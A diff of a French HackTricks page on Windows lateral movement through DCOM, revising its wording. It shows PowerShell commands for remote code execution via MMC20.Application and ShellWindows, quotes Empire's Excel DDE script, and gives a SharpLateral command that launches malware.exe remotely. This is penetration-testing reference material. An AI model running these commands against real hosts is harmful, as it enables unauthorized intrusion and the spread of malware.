@@ -2,17 +2,17 @@
 
 <details>
 
-<summary><strong>Apprenez le piratage AWS de zéro à héros avec</strong> <a href="https://training.hacktricks.xyz/courses/arte"><strong>htARTE (Expert en équipe rouge AWS de HackTricks)</strong></a><strong>!</strong></summary>
+<summary><strong>Apprenez le hacking AWS de zéro à héros avec</strong> <a href="https://training.hacktricks.xyz/courses/arte"><strong>htARTE (HackTricks AWS Red Team Expert)</strong></a><strong>!</strong></summary>
 
-* Travaillez-vous dans une **entreprise de cybersécurité**? Voulez-vous voir votre **entreprise annoncée dans HackTricks**? ou voulez-vous avoir accès à la **dernière version du PEASS ou télécharger HackTricks en PDF**? Consultez les [**PLANS D'ABONNEMENT**](https://github.com/sponsors/carlospolop)!
-* Découvrez [**La famille PEASS**](https://opensea.io/collection/the-peass-family), notre collection exclusive de [**NFTs**](https://opensea.io/collection/the-peass-family)
-* Obtenez le [**swag officiel PEASS & HackTricks**](https://peass.creator-spring.com)
-* **Rejoignez le** [**💬**](https://emojipedia.org/speech-balloon/) [**groupe Discord**](https://discord.gg/hRep4RUj7f) ou le [**groupe Telegram**](https://t.me/peass) ou **suivez** moi sur **Twitter** 🐦[**@carlospolopm**](https://twitter.com/hacktricks\_live)**.**
-* **Partagez vos astuces de piratage en soumettant des PR aux** [**repo hacktricks**](https://github.com/carlospolop/hacktricks) **et** [**repo hacktricks-cloud**](https://github.com/carlospolop/hacktricks-cloud)..
+* Travaillez-vous dans une **entreprise de cybersécurité** ? Voulez-vous voir votre **entreprise annoncée dans HackTricks** ? ou souhaitez-vous avoir accès à la **dernière version de PEASS ou télécharger HackTricks en PDF** ? Consultez les [**PLANS D'ABONNEMENT**](https://github.com/sponsors/carlospolop)!
+* Découvrez [**La Famille PEASS**](https://opensea.io/collection/the-peass-family), notre collection exclusive de [**NFTs**](https://opensea.io/collection/the-peass-family)
+* Obtenez le [**merch officiel PEASS & HackTricks**](https://peass.creator-spring.com)
+* **Rejoignez le** [**💬**](https://emojipedia.org/speech-balloon/) [**groupe Discord**](https://discord.gg/hRep4RUj7f) ou le [**groupe telegram**](https://t.me/peass) ou **suivez**-moi sur **Twitter** 🐦[**@carlospolopm**](https://twitter.com/hacktricks\_live)**.**
+* **Partagez vos astuces de hacking en soumettant des PR au** [**repo hacktricks**](https://github.com/carlospolop/hacktricks) **et** [**repo hacktricks-cloud**](https://github.com/carlospolop/hacktricks-cloud)..
 
 </details>
 
-**Groupe de sécurité Try Hard**
+**Try Hard Security Group**
 
 <figure><img src="/.gitbook/assets/telegram-cloud-document-1-5159108904864449420.jpg" alt=""><figcaption></figcaption></figure>
 
@@ -22,27 +22,26 @@
 
 ## MMC20.Application
 
-**Pour plus d'informations sur cette technique, consultez l'article original sur [https://enigma0x3.net/2017/01/05/lateral-movement-using-the-mmc20-application-com-object/](https://enigma0x3.net/2017/01/05/lateral-movement-using-the-mmc20-application-com-object/)**
+**Pour plus d'infos sur cette technique, consultez le post original de [https://enigma0x3.net/2017/01/05/lateral-movement-using-the-mmc20-application-com-object/](https://enigma0x3.net/2017/01/05/lateral-movement-using-the-mmc20-application-com-object/)**
 
-
-Le modèle d'objet de composant distribué (DCOM) présente une capacité intéressante pour les interactions basées sur le réseau avec des objets. Microsoft fournit une documentation complète pour à la fois DCOM et le modèle d'objet de composant (COM), accessible [ici pour DCOM](https://msdn.microsoft.com/en-us/library/cc226801.aspx) et [ici pour COM](https://msdn.microsoft.com/en-us/library/windows/desktop/ms694363\(v=vs.85\).aspx). Une liste des applications DCOM peut être récupérée en utilisant la commande PowerShell :
+Les objets du Modèle d'Objet Composant Distribué (DCOM) présentent une capacité intéressante pour les interactions basées sur le réseau avec des objets. Microsoft fournit une documentation complète pour DCOM et le Modèle d'Objet Composant (COM), accessible [ici pour DCOM](https://msdn.microsoft.com/en-us/library/cc226801.aspx) et [ici pour COM](https://msdn.microsoft.com/en-us/library/windows/desktop/ms694363\(v=vs.85\).aspx). Une liste d'applications DCOM peut être récupérée en utilisant la commande PowerShell :
 ```bash
 Get-CimInstance Win32_DCOMApplication
 ```
-L'objet COM, [Classe d'application MMC (MMC20.Application)](https://technet.microsoft.com/en-us/library/cc181199.aspx), permet le scriptage des opérations de module enfichable MMC. Notamment, cet objet contient une méthode `ExecuteShellCommand` sous `Document.ActiveView`. Plus d'informations sur cette méthode peuvent être trouvées [ici](https://msdn.microsoft.com/en-us/library/aa815396\(v=vs.85\).aspx). Vérifiez en exécutant :
+L'objet COM, [MMC Application Class (MMC20.Application)](https://technet.microsoft.com/en-us/library/cc181199.aspx), permet le scripting des opérations des modules MMC. Notamment, cet objet contient une méthode `ExecuteShellCommand` sous `Document.ActiveView`. Plus d'informations sur cette méthode peuvent être trouvées [ici](https://msdn.microsoft.com/en-us/library/aa815396\(v=vs.85\).aspx). Vérifiez son fonctionnement :
 
 Cette fonctionnalité facilite l'exécution de commandes sur un réseau via une application DCOM. Pour interagir avec DCOM à distance en tant qu'administrateur, PowerShell peut être utilisé comme suit :
 ```powershell
 [activator]::CreateInstance([type]::GetTypeFromProgID("<DCOM_ProgID>", "<IP_Address>"))
 ```
-Ce commandement se connecte à l'application DCOM et renvoie une instance de l'objet COM. La méthode ExecuteShellCommand peut ensuite être invoquée pour exécuter un processus sur l'hôte distant. Le processus implique les étapes suivantes:
+Cette commande se connecte à l'application DCOM et renvoie une instance de l'objet COM. La méthode ExecuteShellCommand peut ensuite être invoquée pour exécuter un processus sur l'hôte distant. Le processus implique les étapes suivantes :
 
-Vérifier les méthodes:
+Vérifier les méthodes :
 ```powershell
 $com = [activator]::CreateInstance([type]::GetTypeFromProgID("MMC20.Application", "10.10.10.10"))
 $com.Document.ActiveView | Get-Member
 ```
-Obtenir un accès à distance (RCE) :
+Obtenir RCE :
 ```powershell
 $com = [activator]::CreateInstance([type]::GetTypeFromProgID("MMC20.Application", "10.10.10.10"))
 $com | Get-Member
@@ -53,27 +52,27 @@ ls \\10.10.10.10\c$\Users
 ```
 ## ShellWindows & ShellBrowserWindow
 
-**Pour plus d'informations sur cette technique, consultez l'article original [https://enigma0x3.net/2017/01/23/lateral-movement-via-dcom-round-2/](https://enigma0x3.net/2017/01/23/lateral-movement-via-dcom-round-2/)**
+**Pour plus d'informations sur cette technique, consultez le post original [https://enigma0x3.net/2017/01/23/lateral-movement-via-dcom-round-2/](https://enigma0x3.net/2017/01/23/lateral-movement-via-dcom-round-2/)**
 
-L'objet **MMC20.Application** a été identifié comme manquant de "LaunchPermissions" explicites, se basant sur des autorisations permettant l'accès aux administrateurs par défaut. Pour plus de détails, un fil de discussion peut être exploré [ici](https://twitter.com/tiraniddo/status/817532039771525120), et l'utilisation de [@tiraniddo](https://twitter.com/tiraniddo) OleView .NET pour filtrer les objets sans autorisation de lancement explicite est recommandée.
+L'objet **MMC20.Application** a été identifié comme manquant de "LaunchPermissions" explicites, par défaut aux permissions qui permettent l'accès aux Administrateurs. Pour plus de détails, un fil peut être exploré [ici](https://twitter.com/tiraniddo/status/817532039771525120), et l'utilisation de [@tiraniddo](https://twitter.com/tiraniddo)’s OleView .NET pour filtrer les objets sans permission de lancement explicite est recommandée.
 
-Deux objets spécifiques, `ShellBrowserWindow` et `ShellWindows`, ont été mis en avant en raison de leur absence d'autorisations de lancement explicites. L'absence d'une entrée de registre `LaunchPermission` sous `HKCR:\AppID\{guid}` signifie l'absence d'autorisations explicites.
+Deux objets spécifiques, `ShellBrowserWindow` et `ShellWindows`, ont été mis en évidence en raison de leur manque de permissions de lancement explicites. L'absence d'une entrée de registre `LaunchPermission` sous `HKCR:\AppID\{guid}` signifie qu'il n'y a pas de permissions explicites.
 
 ###  ShellWindows
-Pour `ShellWindows`, qui ne possède pas de ProgID, les méthodes .NET `Type.GetTypeFromCLSID` et `Activator.CreateInstance` facilitent l'instanciation de l'objet en utilisant son AppID. Ce processus exploite OleView .NET pour récupérer le CLSID de `ShellWindows`. Une fois instancié, l'interaction est possible via la méthode `WindowsShell.Item`, permettant l'invocation de méthodes telles que `Document.Application.ShellExecute`.
+Pour `ShellWindows`, qui manque d'un ProgID, les méthodes .NET `Type.GetTypeFromCLSID` et `Activator.CreateInstance` facilitent l'instanciation d'objets en utilisant son AppID. Ce processus utilise OleView .NET pour récupérer le CLSID pour `ShellWindows`. Une fois instancié, l'interaction est possible via la méthode `WindowsShell.Item`, conduisant à des invocations de méthodes comme `Document.Application.ShellExecute`.
 
-Des commandes PowerShell d'exemple ont été fournies pour instancier l'objet et exécuter des commandes à distance:
+Des exemples de commandes PowerShell ont été fournis pour instancier l'objet et exécuter des commandes à distance :
 ```powershell
 $com = [Type]::GetTypeFromCLSID("<clsid>", "<IP>")
 $obj = [System.Activator]::CreateInstance($com)
 $item = $obj.Item()
 $item.Document.Application.ShellExecute("cmd.exe", "/c calc.exe", "c:\windows\system32", $null, 0)
 ```
-### Mouvement latéral avec les objets DCOM Excel
+### Mouvement latéral avec des objets DCOM Excel
 
-Le mouvement latéral peut être réalisé en exploitant les objets DCOM Excel. Pour des informations détaillées, il est conseillé de lire la discussion sur l'utilisation de Excel DDE pour le mouvement latéral via DCOM sur le [blog de Cybereason](https://www.cybereason.com/blog/leveraging-excel-dde-for-lateral-movement-via-dcom).
+Le mouvement latéral peut être réalisé en exploitant des objets DCOM Excel. Pour des informations détaillées, il est conseillé de lire la discussion sur l'utilisation d'Excel DDE pour le mouvement latéral via DCOM sur [le blog de Cybereason](https://www.cybereason.com/blog/leveraging-excel-dde-for-lateral-movement-via-dcom).
 
-Le projet Empire fournit un script PowerShell, qui démontre l'utilisation de Excel pour l'exécution de code à distance (RCE) en manipulant des objets DCOM. Ci-dessous des extraits du script disponible sur le [dépôt GitHub d'Empire](https://github.com/EmpireProject/Empire/blob/master/data/module_source/lateral_movement/Invoke-DCOM.ps1), présentant différentes méthodes pour abuser de Excel pour le RCE:
+Le projet Empire fournit un script PowerShell, qui démontre l'utilisation d'Excel pour l'exécution de code à distance (RCE) en manipulant des objets DCOM. Ci-dessous se trouvent des extraits du script disponible sur [le dépôt GitHub d'Empire](https://github.com/EmpireProject/Empire/blob/master/data/module_source/lateral_movement/Invoke-DCOM.ps1), montrant différentes méthodes pour abuser d'Excel pour RCE :
 ```powershell
 # Detection of Office version
 elseif ($Method -Match "DetectOffice") {
@@ -96,7 +95,7 @@ $Obj.DisplayAlerts = $false
 $Obj.DDEInitiate("cmd", "/c $Command")
 }
 ```
-### Outils d'automatisation pour le Mouvement Latéral
+### Outils d'automatisation pour le mouvement latéral
 
 Deux outils sont mis en avant pour automatiser ces techniques :
 
@@ -109,7 +108,7 @@ SharpLateral.exe reddcom HOSTNAME C:\Users\Administrator\Desktop\malware.exe
 ## Outils Automatiques
 
 * Le script Powershell [**Invoke-DCOM.ps1**](https://github.com/EmpireProject/Empire/blob/master/data/module\_source/lateral\_movement/Invoke-DCOM.ps1) permet d'invoquer facilement toutes les méthodes commentées pour exécuter du code sur d'autres machines.
-* Vous pourriez également utiliser [**SharpLateral**](https://github.com/mertdas/SharpLateral):
+* Vous pouvez également utiliser [**SharpLateral**](https://github.com/mertdas/SharpLateral):
 ```bash
 SharpLateral.exe reddcom HOSTNAME C:\Users\Administrator\Desktop\malware.exe
 ```
@@ -118,22 +117,23 @@ SharpLateral.exe reddcom HOSTNAME C:\Users\Administrator\Desktop\malware.exe
 * [https://enigma0x3.net/2017/01/05/lateral-movement-using-the-mmc20-application-com-object/](https://enigma0x3.net/2017/01/05/lateral-movement-using-the-mmc20-application-com-object/)
 * [https://enigma0x3.net/2017/01/23/lateral-movement-via-dcom-round-2/](https://enigma0x3.net/2017/01/23/lateral-movement-via-dcom-round-2/)
 
-**Groupe de sécurité Try Hard**
+**Try Hard Security Group**
 
 <figure><img src="/.gitbook/assets/telegram-cloud-document-1-5159108904864449420.jpg" alt=""><figcaption></figcaption></figure>
 
 {% embed url="https://discord.gg/tryhardsecurity" %}
 
+{% hint style="success" %}
+Apprenez et pratiquez le hacking AWS :<img src="/.gitbook/assets/arte.png" alt="" data-size="line">[**HackTricks Training AWS Red Team Expert (ARTE)**](https://training.hacktricks.xyz/courses/arte)<img src="/.gitbook/assets/arte.png" alt="" data-size="line">\
+Apprenez et pratiquez le hacking GCP : <img src="/.gitbook/assets/grte.png" alt="" data-size="line">[**HackTricks Training GCP Red Team Expert (GRTE)**<img src="/.gitbook/assets/grte.png" alt="" data-size="line">](https://training.hacktricks.xyz/courses/grte)
+
 <details>
 
-<summary><strong>Apprenez le piratage AWS de zéro à héros avec</strong> <a href="https://training.hacktricks.xyz/courses/arte"><strong>htARTE (HackTricks AWS Red Team Expert)</strong></a><strong>!</strong></summary>
+<summary>Soutenir HackTricks</summary>
 
-Autres façons de soutenir HackTricks:
-
-* Si vous souhaitez voir votre **entreprise annoncée dans HackTricks** ou **télécharger HackTricks en PDF**, consultez les [**PLANS D'ABONNEMENT**](https://github.com/sponsors/carlospolop)!
-* Obtenez le [**swag officiel PEASS & HackTricks**](https://peass.creator-spring.com)
-* Découvrez [**The PEASS Family**](https://opensea.io/collection/the-peass-family), notre collection exclusive de [**NFTs**](https://opensea.io/collection/the-peass-family)
-* **Rejoignez le** 💬 [**groupe Discord**](https://discord.gg/hRep4RUj7f) ou le [**groupe Telegram**](https://t.me/peass) ou **suivez-nous** sur **Twitter** 🐦 [**@carlospolopm**](https://twitter.com/hacktricks_live)**.**
-* **Partagez vos astuces de piratage en soumettant des PR aux** [**HackTricks**](https://github.com/carlospolop/hacktricks) et [**HackTricks Cloud**](https://github.com/carlospolop/hacktricks-cloud) github repos.
+* Consultez les [**plans d'abonnement**](https://github.com/sponsors/carlospolop)!
+* **Rejoignez le** 💬 [**groupe Discord**](https://discord.gg/hRep4RUj7f) ou le [**groupe telegram**](https://t.me/peass) ou **suivez-nous sur** **Twitter** 🐦 [**@hacktricks\_live**](https://twitter.com/hacktricks\_live)**.**
+* **Partagez des astuces de hacking en soumettant des PRs aux** [**HackTricks**](https://github.com/carlospolop/hacktricks) et [**HackTricks Cloud**](https://github.com/carlospolop/hacktricks-cloud) dépôts github.
 
 </details>
+{% endhint %}
